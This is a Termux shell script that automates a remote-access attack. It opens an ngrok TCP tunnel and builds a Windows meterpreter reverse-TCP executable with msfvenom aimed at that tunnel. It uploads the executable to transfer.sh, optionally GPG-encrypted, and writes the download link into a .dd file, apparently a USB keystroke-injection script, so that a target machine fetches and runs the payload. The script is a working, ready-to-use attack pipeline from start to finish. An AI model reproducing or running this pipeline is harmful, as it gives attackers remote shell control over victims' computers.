#!/bin/sh
echo "Checking if any ngrok server is already running and killing it..."
~/msf/script/check_ngrok.sh
pkill ngrok
ngrok tcp 5656 > /dev/null &
echo "NGROK RANDOM SERVER TCP IS STARTING..."
sleep 4.5
TEMPFILE=/data/data/com.termux/files/home/msf/temp/.temp_ip_ngrok-tcp.txt
echo "$(curl -s localhost:4040/api/tunnels | grep -Eo "(tcp)://[a-zA-Z0-9./?=_%:-]*" | sed "s#tcp://##g")" > $TEMPFILE
echo "The file\033[1;32m .temp_ip_ngrok-tcp.txt \033[0m has been created to store the IP & PORT address of your ngrok server"
FILE=reverse$RANDOM-$(cat $TEMPFILE |sed "s#:#-port#g").exe
IP=$(cat $TEMPFILE | sed 's/\:.*//')
PORT=$(cat $TEMPFILE |  cut -d ':' -f2)
echo "\033[1;32m \nCreating the payload...\033[0m"
echo "LHOST PAYLOAD: \033[1;34m$IP\033[0m \nLPORT PAYLOAD: \033[1;34m$PORT\033[0m"
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$IP LPORT=$PORT --smallest -f exe > ~/msf/temp/$FILE
echo "\n::::Name of the payload:"
echo "\033[1;32m $FILE  \033[0m"
echo "::::Copying the payload in utiles/msf folder... :\n"
cp ~/msf/temp/$FILE /storage/emulated/0/utiles/msf/
ls /storage/emulated/0/utiles/msf/$FILE

LINKFILE=/data/data/com.termux/files/home/msf/temp/link-$FILE.txt

echo "\033[1;33m\n:::: CLEAR DO YOU WANT TO UPLOAD AND ENCRYPT YOUR PAYLOAD ON TRANSFER.SH? \n:::: Type "y" for UPLOAD, "yy" for UPLOAD & ENCRYPT\033[0m\033[1;32m(BETA)\033[0m\033[1;33m, or press ENTER for none of that\n\033[0m"
read UPLOAD_choice
if [ $UPLOAD_choice = "yy" ]; then
	export GPG_TTY=$(tty)
	cat $FILE|gpg -ac -o-|curl -X PUT --upload-file "-" https://transfer.sh/reverse.exe >link.txt 2>&1
	echo $(cat link.txt| grep http) > $LINKFILE
	echo "\033[1;32m:::: Uploading the file into transfer.sh ... \033[0m"
	echo "\033[1;32m:::: Remember: To download the payload you need to use gpg in your command, like this: \n$ curl https://transfer.sh/XXXX/reverse.exe|gpg -o- > /tmp/reverse.exe\033[0m"
	echo "\033[1;34m\n:::: Creating the file link-****.txt in msf folder\n:::: The direct https link to the payload will be in it\033[0m"
	echo "\033[1;42m::::DONE\033[0m"
	echo "\n::::The payload has been upload on transfer.sh here:\n \033[1;45m$(cat $LINKFILE)\033[0m"
fi
if [ $UPLOAD_choice = "y" ]; then
	curl --upload-file ~/msf/temp/$FILE https://transfer.sh/reverse.exe > $LINKFILE
	echo "\033[1;42m:::: Uploading the file into transfer.sh ... \033[0m"
	echo "\033[1;34m\n:::: Creating the file link-****.txt in msf folder\n:::: The direct https link to the payload will be in it\033[0m"
	echo "\033[1;42m::::DONE\033[0m"
	echo "\n::::The payload has been upload on transfer.sh here:\n \033[1;45m$(cat $LINKFILE)\033[0m"
fi
echo "::::The .dd file is creating .."
rm /storage/emulated/0/utiles/payload.dd
echo "$(cat /data/data/com.termux/files/home/msf/dd/payload_sample.dd | sed "s#$(cat /data/data/com.termux/files/home/msf/dd/payload_sample.dd | grep -Eo 'http.*.exe' | cut -d' ' -f1)#$(cat $LINKFILE)#g")" > /storage/emulated/0/utiles/payload.dd


echo "\033[1;33m\n:::: If you have upload the payload check this:\n:::: If there is no new link, the upload failed \033[0m"
echo "\nold link: \033[1;32m $(cat /data/data/com.termux/files/home/msf/dd/payload_sample.dd | grep -Eo 'http.*.exe' | cut -d' ' -f1)\033[0m"
echo "new link:\033[1;32m $(cat /storage/emulated/0/utiles/payload.dd | grep -Eo 'http.*.exe' | cut -d' ' -f1)\033[0m"
echo "$(cat /data/data/com.termux/files/home/msf/dd/payload_sample.dd | grep -Eo 'http.*.exe' | cut -d' ' -f1)" > ~/msf/temp/old_link.txt
echo "$(cat $LINKFILE)" > ~/msf/temp/new_link.txt
OLDLINK=$(cat ~/msf/temp/old_link.txt)
NEWLINK=$(cat ~/msf/temp/new_link.txt)
if [ "$OLDLINK" = "$NEWLINK" ]
then
	echo "\033[1;31m Failed to change the link in the .dd file \033[0m"
else
	echo "\033[1;32m\n:::: SUCCESS, PAYLOAD.DD CREATED AND STORED here :"
	ls /storage/emulated/0/utiles/payload.dd
fi

echo "\033[1;35m\n:::: Do you want to open the link ? (for QR CODE or Sharing)\nType y for YES, or press Enter to Leave\033[0m"
read openlink
if [ $openlink = "y" ]; then
	termux-open-url $NEWLINK
fi
